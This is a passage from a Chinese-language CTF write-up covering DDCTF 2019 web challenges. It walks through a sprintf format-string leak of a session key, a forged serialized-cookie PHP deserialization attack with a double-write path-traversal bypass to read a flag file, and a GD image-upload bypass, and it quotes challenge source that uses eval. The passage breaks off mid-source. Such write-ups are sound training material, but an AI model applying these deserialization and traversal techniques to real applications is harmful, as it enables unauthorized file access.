</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$session</span><span class=p>[</span><span class=s1>&#39;user_agent&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_USER_AGENT&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=s1>&#39;the user agent not match&#39;</span><span class=p>,</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>session_create</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sessionid</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$sessionid</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$sessionid</span> <span class=o>.=</span> <span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nx>mt_getrandmax</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$userdata</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;session_id&#39;</span> <span class=o>=&gt;</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>uniqid</span><span class=p>(</span><span class=nv>$sessionid</span><span class=p>,</span><span class=k>TRUE</span><span class=p>)),</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;ip_address&#39;</span> <span class=o>=&gt;</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;user_agent&#39;</span> <span class=o>=&gt;</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_USER_AGENT&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;user_data&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$cookiedata</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$userdata</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cookiedata</span> <span class=o>=</span> <span class=nv>$cookiedata</span><span class=o>.</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eancrykey</span><span class=o>.</span><span class=nv>$cookiedata</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$expire</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_expiration</span> <span class=o>+</span> <span class=nx>time</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nx>setcookie</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$cookiedata</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$expire</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_path</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_domain</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_secure</span>
</span></span><span class=line><span class=cl>            <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$ddctf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Session</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$ddctf</span><span class=o>-&gt;</span><span class=na>index</span><span class=p>();</span>
</span></span></code></pre></div><p>我们可以看到 Application.php 中的关键代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>  	<span class=c1>//...
</span></span></span><span class=line><span class=cl><span class=c1></span>	  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>response</span><span class=p>(</span><span class=nv>$data</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$path</span><span class=p>),</span> <span class=s1>&#39;Congratulations&#39;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>	  <span class=c1>//...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>而且在<code>session.php</code>中我们可以找到一处反序列化的地方，所以很明显就需要我们去构建一个反序列化漏洞，利用这里去读取<code>../config/flag.txt</code></p><p>我们在<code>session.php</code>中发现关键代码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;nickname&#34;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;nickname&#34;</span><span class=p>],</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eancrykey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;Welcome my friend %s&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>foreach</span> <span class=p>(</span><span class=nv>$arr</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=nx>sprintf</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$v</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;Welcome&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这里循环使用<code>sprintf</code>格式化打印<code>$arr</code>，所以我们只需要让第二次存在一个<code>%s</code>，即可让他打印出<code>$this->eacrykey</code>，所以可以构造<code>nickname=%s</code>即可得到<code>$this->eacrykey</code>为 EzblrbNS</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009342.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009342.jpg loading=lazy></a></figure></p><p>之后我们可以发现主要就是要构造<code>$session</code>这个变量来触发<code>session_read()</code>函数中的<code>$session = unserialize($session);</code></p><p>于是我们可以先从服务器获取<code>session_create()</code>得到的数据如下</p><pre tabindex=0><code>a:4:{s:10:&#34;session_id&#34;;s:32:&#34;9e887a62624202e40d11881772b19569&#34;;s:10:&#34;ip_address&#34;;s:11:&#34;157.0.25.86&#34;;s:10:&#34;user_agent&#34;;s:82:&#34;Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.14;+rv:66.0)+Gecko/20100101+Firefox/66.0&#34;;s:9:&#34;user_data&#34;;s:0:&#34;&#34;;}a170c04974e03dc5cc763c0ab32d6905;
</code></pre><p>我们就可以得到 ip 了，接下里我们只需要去构造反序列化<code>Application</code>这个类就好了。</p><p>这个类也很简单，主要就是绕过它的这个<code>sanitizepath()</code>方法即可，我们双写就可以绕过了。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>var</span> <span class=nv>$path</span> <span class=o>=</span> <span class=s2>&#34;..././config/flag.txt&#34;</span><span class=p>;</span>
</span></span></code></pre></div><p>所以我们可以在 session.php 中自己本地搭一下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>private</span> <span class=k>function</span> <span class=nf>session_create</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sessionid</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$sessionid</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$sessionid</span> <span class=o>.=</span> <span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>mt_getrandmax</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Application</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$userdata</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;session_id&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;272a4339b6b9340dad9466656d869286&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;ip_address&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;157.0.25.86&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;user_agent&#39;</span> <span class=o>=&gt;</span> <span class=nv>$a</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;user_data&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$cookiedata</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$userdata</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cookiedata</span> <span class=o>=</span> <span class=nv>$cookiedata</span> <span class=o>.</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eancrykey</span> <span class=o>.</span> <span class=nv>$cookiedata</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$expire</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_expiration</span> <span class=o>+</span> <span class=nx>time</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nx>setcookie</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$cookiedata</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$expire</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_path</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_domain</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_secure</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>session_id 修改为服务器获取得到的 session_id 即可，ip_address 服务器也返回了，填上去了就好了。这样我们本地搭起环境，从 http 头中拿到 cookie ，用这个 cookie 访问服务器即可拿到 flag 了。</p><h2 id=web-3-upload-img>Web 3 Upload-IMG</h2><h3 id=description-2>Description</h3><p>{% colorquote info %}</p><p><a class=link href=http://117.51.148.166/upload.php target=_blank rel=noopener>http://117.51.148.166/upload.php</a>
user：dd@ctf
pass：DD@ctf#000</p><p>{% endcolorquote %}</p><h3 id=hacking-2>Hacking</h3><p>CREATOR: gd-jpeg v1.0 (using IJG JPEG v80)</p><p>其他人可以直接用搜到的 jpg_payload.php 可以直接随便拿一个图片都可以拿到 flag ，而我就不行了…应该是图片的原因….</p><p>最后自己按照这个 <a class=link href=https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromjpeg target=_blank rel=noopener>GitHub 仓库</a> 生成拿到了 flag&mldr;</p><h2 id=web-4-homebrew-event-loop>Web 4 homebrew event loop</h2><h3 id=description-3>Description</h3><p>{% colorquote info %}</p><p><a class=link href=http://116.85.48.107:5002/d5af31f96147e657 target=_blank rel=noopener>http://116.85.48.107:5002/d5af31f96147e657</a>
Flag格式：<code>DDCTF{.....}</code>，也就是请手动包裹上<code>DDCTF{}</code></p><p>{% endcolorquote %}</p><h3 id=hacking-3>Hacking</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># -*- encoding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=c1># written in python 2.7</span>
</span></span><span class=line><span class=cl><span class=n>__author__</span> <span class=o>=</span> <span class=s1>&#39;garzon&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>Response</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=s1>&#39;*********************&#39;</span> <span class=c1># censored</span>
</span></span><span class=line><span class=cl><span class=n>url_prefix</span> <span class=o>=</span> <span class=s1>&#39;/d5af31f96147e657&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>FLAG</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;FLAG_is_here_but_i_wont_show_you&#39;</span>  <span class=c1># censored</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigger_event</span><span class=p>(</span><span class=n>event</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>event</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>5</span><span class=p>:</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>][</span><span class=o>-</span><span class=mi>5</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>type</span><span class=p>(</span><span class=n>event</span><span class=p>)</span> <span class=o>==</span> <span class=nb>type</span><span class=p>([]):</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span> <span class=o>+=</span> <span class=n>event</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>event</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_mid_str</span><span class=p>(</span><span class=n>haystack</span><span class=p>,</span> <span class=n>prefix</span><span class=p>,</span> <span class=n>postfix</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>haystack</span> <span class=o>=</span> <span class=n>haystack</span><span class=p>[</span><span class=n>haystack</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>prefix</span><span class=p>):]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>postfix</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>haystack</span> <span class=o>=</span> <span class=n>haystack</span><span class=p>[:</span><span class=n>haystack</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>postfix</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>haystack</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>RollBackException</span><span class=p>:</span> <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_event_loop</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>valid_event_chars</span> <span class=o>=</span> <span class=nb>set</span><span class=p>(</span><span class=s1>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>event</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=c1># `event` is something like &#34;action:ACTION;ARGS0#ARGS1#ARGS2......&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>event</span><span class=o>.</span><span class=n>startswith</span><span class=p>((</span><span class=s1>&#39;action:&#39;</span><span class=p>,</span> <span class=s1>&#39;func:&#39;</span><span class=p>)):</span> <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>event</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>c</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>valid_event_chars</span><span class=p>:</span> <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>is_action</span> <span class=o>=</span> <span class=n>event</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;a&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>action</span> <span class=o>=</span> <span class=n>get_mid_str</span><span class=p>(</span><span class=n>event</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>,</span> <span class=s1>&#39;;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>args</span> <span class=o>=</span> <span class=n>get_mid_str</span><span class=p>(</span><span class=n>event</span><span class=p>,</span> <span class=n>action</span><span class=o>+</span><span class=s1>&#39;;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;#&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>event_handler</span> <span class=o>=</span> <span class=nb>eval</span><span class=p>(</span><span class=n>action</span> <span class=o>+</span> <span class=p>(</span><span class=s1>&#39;_handler&#39;</span> <span class=k>if</span> <span class=n>is_action</span> <span class=k>else</span> <span class=s1>&#39;_function&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>ret_val</span> <span class=o>=</span> <span class=n>event_handler</span><span class=p>(</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=n>RollBackException</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=n>resp</span> <span class=o>+=</span> <span class=s1>&#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=n>resp</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:view;index&#34;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>prev_session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>prev_session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span><span class=p>,</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>                <span class=c1>#resp += str(e) # only for debugging</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>ret_val</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=n>ret_val</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span> <span class=n>resp</span> <span class=o>+=</span> <span class=n>ret_val</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>resp</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>or</span> <span class=n>resp</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span> <span class=n>resp</span> <span class=o>=</span> <span class=p>(</span><span class=s1>&#39;404 NOT FOUND&#39;</span><span class=p>,</span> <span class=mi>404</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=o>.</span><span class=n>modified</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=n>url_prefix</span><span class=o>+</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>entry_point</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>querystring</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>query_string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=o>.</span><span class=n>event_queue</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>querystring</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span> <span class=ow>or</span> <span class=p>(</span><span class=ow>not</span> <span class=n>querystring</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;action:&#39;</span><span class=p>))</span> <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>querystring</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>100</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>querystring</span> <span class=o>=</span> <span class=s1>&#39;action:index;False#False&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;num_items&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span><span class=p>[</span><span class=s1>&#39;log&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=o>.</span><span class=n>prev_session</span> <span class=o>=</span> <span class=nb>dict</span><span class=p>(</span><span class=n>session</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>trigger_event</span><span class=p>(</span><span class=n>querystring</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>execute_event_loop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># handlers/functions below --------------------------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>view_handler</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>page</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>html</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;[INFO] you have </span><span class=si>{}</span><span class=s1> diamonds, </span><span class=si>{}</span><span class=s1> points now.&lt;br /&gt;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>],</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;points&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>page</span> <span class=o>==</span> <span class=s1>&#39;index&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:index;True</span><span class=si>%23F</span><span class=s1>alse&#34;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:view;shop&#34;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:view;reset&#34;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>page</span> <span class=o>==</span> <span class=s1>&#39;shop&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;&lt;a href=&#34;./?action:buy;1&#34;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>page</span> <span class=o>==</span> <span class=s1>&#39;reset&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>del</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;num_items&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>html</span> <span class=o>+=</span> <span class=s1>&#39;Session reset.&lt;br /&gt;&#39;</span>
